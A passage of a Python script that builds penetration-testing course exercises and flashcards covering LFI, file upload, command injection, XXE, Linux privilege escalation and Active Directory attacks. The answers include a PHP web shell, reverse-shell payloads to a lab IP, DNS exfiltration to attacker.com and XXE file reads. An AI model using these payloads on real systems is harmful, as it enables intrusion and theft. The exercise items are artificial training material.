{"module_id":19,"type":"decision_tree","difficulty":"medium","prompt":"LFI is confirmed at ?page=../../../../etc/passwd. Direct path traversal to /var/log/apache2/access.log returns empty. What are your next two options?","options":["Give up — no escalation path","Try php://filter wrapper for source code disclosure AND check /var/log/auth.log /proc/self/environ for alternative log poisoning targets","Only try larger directory traversal depths","Try RFI instead"],"answer":"Try php://filter wrapper for source code disclosure AND check /var/log/auth.log /proc/self/environ for alternative log poisoning targets","explanation":"Empty access.log may mean apache2 uses a different log path (/var/log/nginx/, /var/log/httpd/) or permission issue. Try: auth.log (SSH login failures appear here), /proc/self/environ (contains request headers including User-Agent), and /var/lib/php/sessions/sess_[PHPSESSID] for session poisoning. php://filter always works regardless of log access.","validation_regex":None,"hints":["Empty log ≠ no LFI-to-RCE path","Check other log files and /proc paths"]},

# Module 20 – File Upload
{"module_id":20,"type":"fill_command","difficulty":"medium","prompt":"Write the curl command to upload a file named shell.php to http://target.com/upload, changing the Content-Type to image/jpeg to bypass server-side MIME type validation:","options":None,"answer":"curl -F 'file=@shell.php;type=image/jpeg' http://target.com/upload","explanation":"The ;type=image/jpeg part of the -F flag overrides the Content-Type in the multipart form boundary for that specific file. The server sees Content-Type: image/jpeg instead of application/x-php, bypassing MIME type checks that only validate the header, not the actual file content.","validation_regex":"curl.*-F.*shell\\.php.*type=image/jpeg|curl.*file=.*shell.*image/jpeg","hints":[";type= overrides the Content-Type for the file part","The server sees image/jpeg even though the file is PHP"]},
{"module_id":20,"type":"multiple_choice","difficulty":"medium","prompt":"A server blocks .php but allows .php5, .phtml, and .phar. Which of these will actually execute as PHP depends on:","options":["File size","Apache/PHP configuration — specifically which extensions are mapped to the PHP handler in .htaccess or httpd.conf","The web framework","The filename itself"],"answer":"Apache/PHP configuration — specifically which extensions are mapped to the PHP handler in .htaccess or httpd.conf","explanation":"PHP execution depends on Apache configuration. In .htaccess: AddHandler application/x-httpd-php .php5 .phtml .phar maps those extensions to PHP. Without this mapping, the file is downloaded as text. Test each extension to see which ones execute — in some environments only .php5 works, in others all alternatives execute.","validation_regex":None,"hints":["Apache decides which extensions run PHP","Check .htaccess configuration"]},
{"module_id":20,"type":"fill_command","difficulty":"hard","prompt":"Write the command to create a PHP web shell file that starts with GIF magic bytes (to bypass content-based validation) and contains a system() call:","options":None,"answer":"echo -e 'GIF89a\\n<?php system($_GET[\"cmd\"]); ?>' > shell.gif.php","explanation":"GIF89a is the magic byte signature for GIF images. File validators that check only the first bytes (magic bytes) see this as a valid image. The PHP code after the header executes when the file is included/accessed as PHP. The .gif.php double extension ensures the web server processes it as PHP.","validation_regex":"GIF89a.*php.*system|echo.*GIF89a.*php","hints":["GIF89a is the magic byte signature","PHP code after the magic bytes still executes"]},
{"module_id":20,"type":"case_file","difficulty":"hard","prompt":"You successfully upload shell.php to a target server. The upload response shows: 'File uploaded: /uploads/2024/shell.php'. But accessing http://target.com/uploads/2024/shell.php returns 404. What are your next steps?","options":None,"answer":"Step 1 — Check different URL paths: try /upload/2024/shell.php, /files/2024/shell.php, /assets/uploads/ — the response path may use a different web-accessible prefix.\nStep 2 — Look for file path disclosure: check the page source after upload, look for <img src=...> tags revealing the actual uploaded file URL.\nStep 3 — Use ffuf to discover upload directory: ffuf -w wordlist.txt -u http://target.com/FUZZ/2024/shell.php -mc 200\nStep 4 — Check if the upload directory is excluded from web access (.htaccess deny from all, nginx location block). Try downloading shell.php directly: curl http://target.com/uploads/2024/shell.php -v — check for X-Accel-Redirect or Content-Disposition headers.\nStep 5 — If directory is outside web root, find another upload path or chain with path traversal in the filename.","explanation":"Successful upload ≠ web-executable file. The upload path must be web-accessible. Fuzzing and source inspection reveal the actual accessible URL.","validation_regex":"(?i)ffuf|path|404|url|source|accessible","hints":["The upload path shown may differ from the web-accessible path","Fuzz for the correct URL prefix"]},
{"module_id":20,"type":"decision_tree","difficulty":"medium","prompt":"An upload field accepts images only. You try shell.php (blocked), shell.php5 (blocked), shell.php.jpg (200 OK — uploaded). How do you verify if the .php.jpg file executes as PHP?","options":["It definitely executes — jpg extensions always run PHP","Access the uploaded file URL and check if the PHP code executes (returns id output) or is served as text/image","Rename to .php after upload","It never executes — only .php runs PHP"],"answer":"Access the uploaded file URL and check if the PHP code executes (returns id output) or is served as text/image","explanation":"Double extension execution depends entirely on server configuration. Some Apache configs execute the leftmost PHP-matching extension regardless of additional extensions. Test empirically: access the URL, check Content-Type header in response, and look for PHP execution output vs raw file content. If it executes, you have RCE.","validation_regex":None,"hints":["Server config determines if double extension executes","Test by accessing the file — does it run or download?"]},

# Module 21 – Command Injection
{"module_id":21,"type":"fill_command","difficulty":"medium","prompt":"A web app has a 'ping' feature that takes an IP address. Write two payloads: one to test for command injection with a time delay, and one to read /etc/passwd if injection is confirmed:","options":None,"answer":"# Time delay test:\n127.0.0.1; sleep 5\n# or: 127.0.0.1 && sleep 5\n# or: 127.0.0.1 | sleep 5\n\n# Read /etc/passwd (after confirmed injection):\n127.0.0.1; cat /etc/passwd\n# or: 127.0.0.1 && cat /etc/passwd","explanation":"Sleep 5 causes a 5-second delay confirming OS command execution without requiring network connectivity or output visibility. After confirmation, use the same operator that worked (;, &&, or |) with your actual command.","validation_regex":"sleep 5|cat /etc/passwd.*127\\.0\\.0\\.1|127\\.0\\.0\\.1.*sleep","hints":["Use the same operator for both payloads","Test with sleep before any data extraction"]},
{"module_id":21,"type":"multiple_choice","difficulty":"medium","prompt":"The application filters spaces in command injection payloads. Which alternative to a space works in bash?","options":["Use tab character","Use $IFS variable","Both $IFS and {cmd,arg} brace expansion work","Spaces can't be bypassed"],"answer":"Both $IFS and {cmd,arg} brace expansion work","explanation":"$IFS (Internal Field Separator) defaults to space in bash and substitutes for space in command arguments. Brace expansion {cat,/etc/passwd} works for commands with arguments — bash expands it to cat /etc/passwd. Both bypass space filters. Also valid: cat</etc/passwd (here-string without space), cat${IFS}/etc/passwd.","validation_regex":None,"hints":["$IFS is the Internal Field Separator","Brace expansion doesn't need spaces"]},
{"module_id":21,"type":"fill_command","difficulty":"hard","prompt":"A web application filtering spaces, semicolons, and the pipe character. Write a bash command injection payload that reads /etc/passwd using brace expansion and $IFS:","options":None,"answer":"{cat,/etc/passwd}\n# or:\ncat${IFS}/etc/passwd\n# or:\ncat$IFS/etc/passwd","explanation":"Brace expansion {cat,/etc/passwd} is equivalent to 'cat /etc/passwd' in bash — no space or operators needed. $IFS replaces space. These bypass filters that target specific punctuation while allowing characters that appear in normal data.","validation_regex":"\\{cat,/etc/passwd\\}|cat\\$\\{IFS\\}/etc/passwd|cat\\$IFS/etc","hints":["Brace expansion: {cmd,arg} = cmd arg","$IFS substitutes for space"]},
{"module_id":21,"type":"decision_tree","difficulty":"hard","prompt":"You have confirmed command injection via sleep delay. The application blocks outbound TCP. All reverse shell attempts fail. How do you still extract data?","options":["Give up","Write output to a file in the web root and read it via HTTP","Use DNS-based exfiltration or write output to web root","Only option is a network shell"],"answer":"Use DNS-based exfiltration or write output to web root","explanation":"Write-to-web-root: ; id > /var/www/html/out.txt, then access http://target.com/out.txt converts blind to visible injection. DNS exfiltration: ; nslookup $(id).attacker.com — encodes output in DNS queries captured by your DNS server. Both work without TCP connectivity to the attacker.","validation_regex":None,"hints":["Write to a web-accessible file","DNS carries data too"]},
{"module_id":21,"type":"fill_command","difficulty":"medium","prompt":"Write the URL-encoded command injection payload to establish a bash reverse shell to 10.10.14.5:4444, suitable for injection in a GET parameter:","options":None,"answer":"127.0.0.1%3b+bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261\n# Decoded: 127.0.0.1; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n# %3b = ; (semicolon), %26 = & (ampersand), spaces = +","explanation":"GET parameters require URL encoding of special characters. %3b is semicolon, %26 is ampersand, + replaces space. The reverse shell uses bash /dev/tcp — no additional tools required.","validation_regex":"bash.*-i.*dev/tcp.*10\\.10\\.14\\.5.*4444|%3[Bb].*bash.*dev.tcp","hints":["%3b is URL encoding for semicolon","%26 is URL encoding for &"]},

# Module 22 – Web Attacks (IDOR/XXE/Verb Tampering)
{"module_id":22,"type":"fill_command","difficulty":"medium","prompt":"Write the curl command to test HTTP verb tampering — send a DELETE request to http://target.com/admin/users/5 that normally returns 403 on GET:","options":None,"answer":"curl -X DELETE http://target.com/admin/users/5 -v","explanation":"-X DELETE sends a DELETE request. -v shows the full response headers and body. If the server applies access control only to GET methods, DELETE may succeed and actually delete user ID 5. Also test: OPTIONS (to see allowed methods), POST, PUT, PATCH.","validation_regex":"curl.*-X DELETE.*admin/users|curl.*DELETE.*target\\.com","hints":["-X specifies the HTTP method","-v shows full request/response headers"]},
{"module_id":22,"type":"fill_command","difficulty":"medium","prompt":"Write the XXE payload to read /etc/passwd via an XML POST body, where the result appears in the <element> tag:","options":None,"answer":"<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><element>&xxe;</element></root>","explanation":"DOCTYPE defines the external entity 'xxe' pointing to file:///etc/passwd. &xxe; in the body references the entity — the parser replaces it with the file contents. The result appears wherever &xxe; is used. Requires the application to parse XML and return entity values in the response.","validation_regex":"DOCTYPE.*ENTITY.*xxe.*SYSTEM.*file:///etc/passwd|ENTITY.*xxe.*passwd","hints":["DOCTYPE defines the entity","SYSTEM references a local file","&xxe; is where the content appears"]},
{"module_id":22,"type":"multiple_choice","difficulty":"medium","prompt":"You find an API endpoint: GET /api/orders/1001 that returns your order details. What is the first thing to test for IDOR?","options":["SQL inject the order ID","Change 1001 to 1000, 1002, 999, etc. and compare responses","Change the HTTP method to POST","Fuzz with ffuf"],"answer":"Change 1001 to 1000, 1002, 999, etc. and compare responses","explanation":"IDOR testing starts by simply changing the identifier to adjacent values. If the API returns a different user's order details (different name, address, items), IDOR is confirmed. Use Burp Repeater for quick manual testing, or Intruder with a number list for bulk testing. Compare response sizes to identify hits.","validation_regex":None,"hints":["IDOR = changing the ID accesses other users' data","Try adjacent numbers first"]},
{"module_id":22,"type":"case_file","difficulty":"hard","prompt":"You find a SOAP web service that sends XML in POST requests. A sample request has: <ProductId>1</ProductId>. Describe how to test for XXE in this SOAP request.","options":None,"answer":"Step 1 — Intercept the SOAP request in Burp Repeater.\nStep 2 — Add the XXE DOCTYPE before the <soapenv:Envelope> tag:\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<soapenv:Envelope...>\n  <ProductId>&xxe;</ProductId>\n</soapenv:Envelope>\nStep 3 — Forward and check if /etc/passwd contents appear in the response error or data fields.\nStep 4 — If no reflection: test blind XXE with HTTP callback: <!ENTITY xxe SYSTEM \"http://10.10.14.5/xxe\"> — check listener for incoming request.\nStep 5 — If successful: read sensitive files (web.config, application.properties, /etc/shadow, SSH keys) and attempt SSRF via the XXE to reach internal services.","explanation":"SOAP services parse XML and are frequently vulnerable to XXE. The DOCTYPE declaration must come before the root element. SSRF via XXE can reach internal services (AWS metadata, internal APIs) that are otherwise inaccessible.","validation_regex":"(?i)DOCTYPE|ENTITY|SOAP|xxe|callback|SSRF|file:///etc","hints":["DOCTYPE goes before the SOAP envelope","&xxe; replaces the parameter value"]},
{"module_id":22,"type":"decision_tree","difficulty":"medium","prompt":"A base64-encoded value in a Cookie header decodes to: {\"userId\":42,\"role\":\"user\"}. What attack do you attempt?","options":["Ignore — cookies are signed","Decode → change role to 'admin' and userId to 1 → re-encode → replace cookie → test if it works","SQL inject the cookie value","Delete the cookie"],"answer":"Decode → change role to 'admin' and userId to 1 → re-encode → replace cookie → test if it works","explanation":"Unsigned base64-encoded cookies are classic IDOR/insecure direct object reference vulnerabilities. If the server trusts the client-supplied role and userId values without verifying a signature/MAC, changing them grants privilege escalation. Use Burp Decoder: CT + base64 decode → edit JSON → base64 encode → replace in Cookie header.","validation_regex":None,"hints":["Base64 is encoding, not encryption","If there's no signature, the server may trust the values"]},

# Module 23 – Attacking Common Apps
{"module_id":23,"type":"fill_command","difficulty":"medium","prompt":"Write the wpscan command to enumerate WordPress users and plugins on http://target.com, using aggressive plugin detection with an API token:","options":None,"answer":"wpscan --url http://target.com -e u,p --plugins-detection aggressive --api-token YOUR_API_TOKEN","explanation":"-e u enumerates users, -e p enumerates plugins. --plugins-detection aggressive sends more requests to detect non-listed plugins. --api-token enables CVE lookup from WPScan vulnerability database. Without API token, CVE data is unavailable but enumeration still works.","validation_regex":"wpscan.*--url.*-e.*u.*p|wpscan.*--plugins-detection aggressive","hints":["-e u,p enumerates users and plugins","aggressive detection sends more requests"]},
{"module_id":23,"type":"fill_command","difficulty":"medium","prompt":"Write the msfvenom command to generate a WAR file reverse shell payload for Apache Tomcat manager upload, connecting to tun0 on port 4444:","options":None,"answer":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war","explanation":"Java JSP payloads in WAR format are deployable via Tomcat Manager. -f war outputs as a Web Application Archive. Deploy via /manager/text/deploy endpoint with curl or the GUI at /manager/html. Access the deployed app at /shell/ to trigger execution.","validation_regex":"msfvenom.*java/jsp_shell_reverse_tcp.*LHOST.*LPORT.*4444.*-f war|msfvenom.*war.*java","hints":["Use java/jsp payload for Tomcat","-f war creates a deployable archive"]},
{"module_id":23,"type":"multiple_choice","difficulty":"medium","prompt":"What WordPress file, when uploaded through Appearance → Theme Editor, immediately provides PHP code execution?","options":["wp-config.php","functions.php or 404.php in any active theme","wp-login.php","readme.html"],"answer":"functions.php or 404.php in any active theme","explanation":"The Theme Editor (Appearance → Theme Editor) allows editing PHP files of the active theme. Adding <?php system($_GET['cmd']); ?> to 404.php and accessing http://target.com/wp-content/themes/[theme]/404.php?cmd=id provides direct PHP RCE. This is the primary WordPress admin → RCE path in CPTS.","validation_regex":None,"hints":["Theme PHP files execute on access","404.php is always present in active themes"]},
{"module_id":23,"type":"fill_command","difficulty":"hard","prompt":"Write the Jenkins Groovy script to execute 'id' and print the result in the Script Console:","options":None,"answer":"def cmd = 'id'.execute()\nprintln cmd.text","explanation":"Jenkins Script Console accepts arbitrary Groovy code with access to the full JVM. 'id'.execute() runs an OS command via Runtime.exec(). .text reads standard output. This is direct OS RCE as the Jenkins service user (often jenkins, sometimes SYSTEM on Windows).","validation_regex":"['\"]id['\"].*execute\\(\\)|println.*cmd\\.text|cmd.*execute.*println","hints":["Groovy's .execute() runs OS commands","Use .text to read stdout"]},
{"module_id":23,"type":"case_file","difficulty":"hard","prompt":"You find a GitLab instance with public repositories. Describe your complete methodology to find secrets in commit history.","options":None,"answer":"Step 1 — Clone all accessible repos: for each repo URL, run git clone http://target.com/user/repo.git\nStep 2 — Run automated secret scanning:\n  gitleaks detect -s /path/to/repo --log-level info\n  truffleHog git /path/to/repo --only-verified\nStep 3 — Manual git log review:\n  git log --all --full-history  # All commits including deleted branches\n  git log -p --all | grep -i 'password\\|secret\\|key\\|token\\|api'  # Search history\nStep 4 — Check deleted files:\n  git log --diff-filter=D --summary  # Shows deleted files\n  git show COMMIT_HASH:path/to/deleted/file  # Recover deleted file content\nStep 5 — Check .env, config.*, settings.* in all branches:\n  git branch -a  # List all branches\n  git checkout branch-name && cat .env","explanation":"Git history permanently stores all previous commits including deleted secrets. Tools automate pattern matching but manual grep catches non-standard secret formats.","validation_regex":"(?i)gitleaks|truffleHog|git log|git clone|secret|commit history","hints":["git log --all shows all history including deleted branches","gitleaks and truffleHog automate secret detection"]},

# Module 24 – Linux PrivEsc
{"module_id":24,"type":"fill_command","difficulty":"easy","prompt":"Write the command to find all SUID binaries on the Linux filesystem, suppressing permission denied errors:","options":None,"answer":"find / -perm -4000 -type f 2>/dev/null","explanation":"-perm -4000 matches files with the SUID bit set. -type f limits to regular files only. 2>/dev/null suppresses 'Permission denied' errors from directories you can't read. The output list should be checked against GTFOBins for known privilege escalation paths.","validation_regex":"find / -perm -4000 -type f 2>/dev/null","hints":["-perm -4000 matches SUID bit","2>/dev/null suppresses permission errors"]},
{"module_id":24,"type":"fill_command","difficulty":"medium","prompt":"sudo -l output shows: (root) NOPASSWD: /usr/bin/find. Write the GTFOBins command to escalate to root using this sudo permission:","options":None,"answer":"sudo find /tmp -exec /bin/bash \\;","explanation":"sudo find runs with root privileges. The -exec flag executes a command for each found file. /bin/bash spawns a root shell, receiving find's elevated privileges. \\; terminates the -exec argument. This is one of the most common GTFOBins sudo escapes documented at gtfobins.github.io/gtfobins/find/.","validation_regex":"sudo find.*-exec.*/bin/bash|sudo find.*exec.*bash","hints":["find's -exec runs commands for each result","The command runs with find's (root) privileges"]},
{"module_id":24,"type":"multiple_choice","difficulty":"medium","prompt":"pspy64 shows this running every minute as root: /bin/bash /opt/scripts/backup.sh. You check permissions: -rwxrwxrwx backup.sh. What do you do?","options":["Nothing — it's a system script","Add a reverse shell one-liner to backup.sh and wait 1 minute for root shell","Delete the script","Change script ownership"],"answer":"Add a reverse shell one-liner to backup.sh and wait 1 minute for root shell","explanation":"World-writable (rwxrwxrwx) cron scripts running as root are trivially exploitable. Append: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/scripts/backup.sh. Set up your listener (nc -lvnp 4444), wait for cron to fire, and receive a root reverse shell.","validation_regex":None,"hints":["World-writable = anyone can write to it","The script runs as root every minute"]},
{"module_id":24,"type":"case_file","difficulty":"hard","prompt":"You have a shell as www-data on a Linux server. linPEAS shows /etc/passwd is world-writable (-rw-rw-rw-). Describe the complete exploitation to get a root shell.","options":None,"answer":"Step 1 — Verify writable: ls -la /etc/passwd → confirms -rw-rw-rw-\nStep 2 — Generate password hash:\n  openssl passwd -1 -salt xyz password123\n  → Outputs: $1$xyz$AbcDefGhijklMnopQrst0/\nStep 3 — Create a new root-equivalent entry:\n  echo 'hacker:$1$xyz$AbcDefGhijklMnopQrst0/:0:0:root:/root:/bin/bash' >> /etc/passwd\n  (UID:GID 0:0 → root level)\nStep 4 — Switch to the new user:\n  su - hacker  # Enter: password123\n  whoami       # Should return: root\nStep 5 — Verify: id → uid=0(root) gid=0(root)","explanation":"/etc/passwd writable allows adding arbitrary users. UID/GID 0 grants root privileges. The new entry bypasses /etc/shadow entirely since a hash in /etc/passwd takes precedence over shadow on many systems.","validation_regex":"(?i)openssl passwd|echo.*hacker.*0:0.*passwd|su.*hacker|uid=0","hints":["UID 0 and GID 0 in /etc/passwd = root","openssl passwd generates a compatible hash"]},
{"module_id":24,"type":"fill_command","difficulty":"hard","prompt":"Write the command sequence to use a SUID bash binary (/usr/bin/bash has s-bit) to spawn a root shell:","options":None,"answer":"/usr/bin/bash -p\n# -p preserves the effective UID (eUID=0) when running SUID bash\n# Verify with: id → euid=0(root)","explanation":"When bash has the SUID bit, it normally drops privileges for security. The -p flag (privileged mode) prevents this privilege drop, preserving the effective UID=0 (root). Without -p, bash drops to the real UID regardless of SUID. This only works when /bin/bash or another bash binary has the SUID bit set.","validation_regex":"/usr/bin/bash -p|bash.*-p.*suid|SUID.*bash -p","hints":["-p preserves SUID privileges in bash","Without -p, bash drops to real UID"]},
]

# Filter duplicates and add
for ex in new_exercises:
    if ex['prompt'] not in existing_prompts:
        exercises_expanded.append(ex)
        existing_prompts.add(ex['prompt'])

save('exercises-expanded.json', exercises_expanded)
print(f"exercises-expanded.json: {len(exercises_expanded)} total entries")

# ─────────────────────────────────────────────────────────────────────────────
# FLASHCARDS (modules 12-24, 10 each = 130 flashcards)
# ─────────────────────────────────────────────────────────────────────────────
new_flashcards = [

# Module 12 – AD
{"module_id":12,"question":"What is DCSync and what privileges does it require?","answer":"DCSync mimics a domain controller replication request to retrieve NTLM hashes for any user — including the krbtgt account. Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All privileges. Domain Admins have these by default. Tool: impacket-secretsdump -just-dc-ntlm.","tags":["active-directory","dcsync","credentials"]},
{"module_id":12,"question":"What BloodHound query reveals the attack path from your compromised account to Domain Admin?","answer":"'Shortest Paths to Domain Admins from Owned Principals' — after marking your owned accounts by right-clicking → Mark as Owned in BloodHound. This query shows the exact sequence of ACL abuses, group memberships, or delegation misconfigurations to escalate.","tags":["bloodhound","active-directory","attack-path"]},
{"module_id":12,"question":"What does AS-REP Roasting target and what hashcat mode cracks the result?","answer":"Accounts with UF_DONT_REQUIRE_PREAUTH set. These respond to AS-REQ without Kerberos pre-auth, returning an AS-REP encrypted with their password hash. Tool: impacket-GetNPUsers. Hashcat mode: -m 18200.","tags":["kerberos","as-rep","active-directory"]},
{"module_id":12,"question":"What AD attribute frequently stores passwords when administrators are lazy?","answer":"The Description attribute on user accounts. Check with: Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}. Administrators store temporary passwords, service account credentials, and API keys in Description fields.","tags":["active-directory","enumeration","credentials"]},
{"module_id":12,"question":"What is the difference between Pass-the-Hash and Pass-the-Ticket?","answer":"Pass-the-Hash (PTH) uses an NTLM hash to authenticate to Windows services (SMB, WinRM, RDP) without knowing the plaintext password. Pass-the-Ticket (PTT) uses a stolen Kerberos TGT/TGS ticket for authentication. PTT is stealthier in environments with NTLM logging enabled.","tags":["active-directory","lateral-movement","kerberos"]},
{"module_id":12,"question":"What PowerView command identifies Kerberoastable service accounts?","answer":"Get-DomainUser -SPN — lists all domain accounts with a ServicePrincipalName set. Any account with an SPN can be Kerberoasted. Also: Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName to see which services they run.","tags":["powerview","kerberoasting","active-directory"]},
{"module_id":12,"question":"What is GenericAll in Active Directory ACL and what can it do?","answer":"GenericAll grants full control over an AD object. If you have GenericAll on a user: force-change their password (no old password needed). On a group: add yourself. On a computer: RBCD attack. BloodHound highlights GenericAll paths — they are reliable privilege escalation routes that require no CVE exploitation.","tags":["active-directory","acl","privilege-escalation"]},
{"module_id":12,"question":"How does bloodhound-python differ from SharpHound?","answer":"bloodhound-python runs from Linux without domain join — only requires valid domain credentials and network access to DC. SharpHound runs from Windows (ideally domain-joined or with user context). bloodhound-python output is JSON/ZIP importable into BloodHound. Both collect the same data types.","tags":["bloodhound","active-directory","enumeration"]},
{"module_id":12,"question":"What is the SYSVOL and why is it checked during AD enumeration?","answer":"SYSVOL is a domain-wide shared folder (\\\\domain\\SYSVOL) containing GPO files, scripts, and policies replicated to all DCs. Old Group Policy Preferences (GPP) files stored encrypted admin passwords (cpassword field) using a known AES key — Get-GPPPassword decrypts them. Also check login scripts for credentials.","tags":["active-directory","sysvol","gpp"]},
{"module_id":12,"question":"What is a Golden Ticket and how long is it valid?","answer":"A Golden Ticket is a forged Kerberos TGT created using the krbtgt account's NTLM hash. It grants access to any service in the domain as any user. Valid for 10 years by default. Tool: mimikatz kerberos::golden. Requires krbtgt hash (obtained via DCSync). Persists even after all user password changes (only invalidated by resetting krbtgt twice).","tags":["kerberos","golden-ticket","active-directory"]},

# Module 13 – Web Proxies
{"module_id":13,"question":"How do you configure Burp Suite to intercept HTTPS traffic from a browser?","answer":"1. Set browser proxy to 127.0.0.1:8080. 2. Navigate to http://burp in the browser and download the CA certificate. 3. Import the certificate as a trusted authority in browser certificate settings. 4. Toggle intercept on in Burp Proxy tab.","tags":["burp-suite","proxy","https"]},
{"module_id":13,"question":"What is the difference between Burp Repeater and Intruder?","answer":"Repeater: manual, one request at a time — modify and resend for testing injections, auth bypass, IDOR. Intruder: automated — uses payload lists and positions to send many requests for brute-force, fuzzing, and IDOR mass testing. Community Edition throttles Intruder — use ffuf for speed.","tags":["burp-suite","repeater","intruder"]},
{"module_id":13,"question":"What Burp feature allows you to modify all requests matching a pattern automatically?","answer":"Proxy → Options → Match and Replace. Rules can find/replace strings in request/response headers and bodies. Useful for: adding X-Forwarded-For: 127.0.0.1 to bypass IP restrictions, replacing User-Agent, or adding custom headers to every request automatically.","tags":["burp-suite","match-replace","automation"]},
{"module_id":13,"question":"What are the four Intruder attack types?","answer":"Sniper: one parameter position, one wordlist. Battering Ram: same value in all positions simultaneously. Pitchfork: multiple positions, multiple lists iterated in parallel (position1[1]+list2[1], position1[2]+list2[2]). Cluster Bomb: all combinations of all lists — use for username+password brute-force.","tags":["burp-suite","intruder","attack-types"]},
{"module_id":13,"question":"How do you route curl requests through Burp Suite for interception?","answer":"curl -x http://127.0.0.1:8080 [URL] — the -x flag sets the proxy. Add -k to ignore Burp's self-signed certificate for HTTPS. Example: curl -x http://127.0.0.1:8080 -k https://target.com/api/users","tags":["curl","burp-suite","proxy"]},
{"module_id":13,"question":"What is the JWT alg:none attack?","answer":"JWT headers contain the algorithm used for signature verification. Changing alg to 'none' and removing the signature tricks vulnerable implementations into accepting any payload as valid without verification. Modify: decode header (b64) → change alg to 'none' → re-encode → remove signature portion → send.","tags":["jwt","web-proxies","authentication"]},
{"module_id":13,"question":"What Burp feature saves and replays a multi-step authentication process?","answer":"Project Options → Sessions → Macros. A macro records a sequence of requests and can be configured to extract values (like CSRF tokens) from responses and inject them into subsequent requests. Required for testing authenticated endpoints behind multi-step logins.","tags":["burp-suite","macros","session-handling"]},
{"module_id":13,"question":"How do you identify API endpoints not visible in standard browser navigation?","answer":"Check Burp Proxy History (all requests the browser made), filter by Javascript and XHR resource types. Review JS source files in Browser DevTools (Sources tab) for fetch(), axios, and XMLHttpRequest calls. Look for hardcoded API routes and base URLs. Also: JS Beautifier for minified code.","tags":["api","burp-suite","enumeration"]},
{"module_id":13,"question":"What HTTP status codes indicate successful authentication bypass?","answer":"302 Found (redirect to authenticated area), 200 OK with different body content than the login page, 401→200 transition after header modification. A 403 becoming 200 after method change indicates access control bypass. Compare response size and content carefully — status alone can be misleading.","tags":["http","status-codes","authentication"]},
{"module_id":13,"question":"What is CORS and how can it be misconfigured to enable attacks?","answer":"Cross-Origin Resource Sharing controls which origins can make cross-origin requests. Misconfiguration: Access-Control-Allow-Origin: * (all origins) with Access-Control-Allow-Credentials: true = any site can read the API response as the victim. Exploit: craft a page that calls the API using the victim's session cookie and exfiltrates the response.","tags":["cors","web-proxies","misconfiguration"]},

# Module 14 – Ffuf
{"module_id":14,"question":"What ffuf keyword is used as the placeholder for the fuzzed value?","answer":"FUZZ — placed anywhere in the request: URL path (target.com/FUZZ), parameter name (?FUZZ=value), parameter value (?id=FUZZ), or Host header (FUZZ.target.com for vhost enum). Multiple FUZZ keywords can be used with different wordlists via -w w1:W1 -w w2:W2 notation.","tags":["ffuf","fuzzing","web-exploitation"]},
{"module_id":14,"question":"How do you perform virtual host enumeration with ffuf?","answer":"ffuf -w subdomains.txt -u http://TARGET_IP -H 'Host: FUZZ.target.com' -fs DEFAULT_SIZE. Place FUZZ in the Host header, point to the server IP, filter by the default response size. Valid vhosts return a different (usually larger) response.","tags":["ffuf","vhost","enumeration"]},
{"module_id":14,"question":"What ffuf flags filter responses to reduce false positives?","answer":"-fc (filter by HTTP code), -fs (filter by size in bytes), -fw (filter by word count), -fl (filter by line count), -ft (filter by time). Conversely, -mc/-ms/-mw/-ml/-mt MATCH instead of filter. Run once to identify the baseline response, then filter or match accordingly.","tags":["ffuf","filtering","false-positives"]},
{"module_id":14,"question":"What wordlist is best for PHP file discovery with ffuf?","answer":"/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt for files, or use -w with directory-list-2.3-medium.txt and -e .php,.txt,.bak,.old for extension fuzzing. The raft lists are organised and comprehensive for file discovery.","tags":["ffuf","wordlists","web-exploitation"]},
{"module_id":14,"question":"How do you fuzz POST body parameters with ffuf?","answer":"ffuf -w params.txt -u http://target.com/endpoint -X POST -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fs BASELINE_SIZE. For JSON bodies: -d '{\"FUZZ\":\"value\"}' -H 'Content-Type: application/json'. The FUZZ keyword replaces the parameter name.","tags":["ffuf","post","parameter-fuzzing"]},
{"module_id":14,"question":"What seclist wordlist is best for subdomain/vhost enumeration with ffuf?","answer":"/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt for quick scans, or subdomains-top1million-20000.txt for comprehensive. Also: /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt for a comprehensive combined list.","tags":["ffuf","seclists","vhost"]},
{"module_id":14,"question":"What ffuf flag enables recursive directory fuzzing?","answer":"-recursion — automatically fuzzes discovered directories. -recursion-depth N limits depth (e.g., -recursion-depth 3). Use with -fc 404 to clean output. Essential for discovering multi-level directory structures that flat scans miss.","tags":["ffuf","recursive","directories"]},
{"module_id":14,"question":"How do you make ffuf output results to a JSON file for later analysis?","answer":"-o results.json -of json. The JSON format includes URL, status, size, words, lines, and response time for each result. Import into other tools or grep/jq for analysis. Also supported: -of csv, -of html, -of md.","tags":["ffuf","output","json"]},
{"module_id":14,"question":"What is the difference between -mc and -fc in ffuf?","answer":"-mc MATCH codes: only show results with these status codes (whitelist). -fc FILTER codes: hide results with these status codes (blacklist). Use -mc 200,301,302 to show only redirects and successes. Use -fc 404,403 to hide not-found and forbidden responses.","tags":["ffuf","filtering","matching"]},
{"module_id":14,"question":"How do you perform extension fuzzing on a discovered file with ffuf?","answer":"ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://target.com/admin.FUZZ -fc 404. Place FUZZ where the extension goes. This discovers backup files (.bak, .old, .php.bak), source files (.php~), and config files (.conf, .ini) associated with a discovered path.","tags":["ffuf","extensions","web-exploitation"]},

# Module 15 – Login Brute Forcing
{"module_id":15,"question":"What hydra option specifies the failure string in HTTP form brute-force?","answer":"F= prefix in the http-post-form module: 'F=failure text'. The string after F= must appear in the response on failed login. Get it from a test login in Burp Repeater. Alternative: S= for success string. Full format: '/path:body:F=fail text'","tags":["hydra","brute-force","http-form"]},
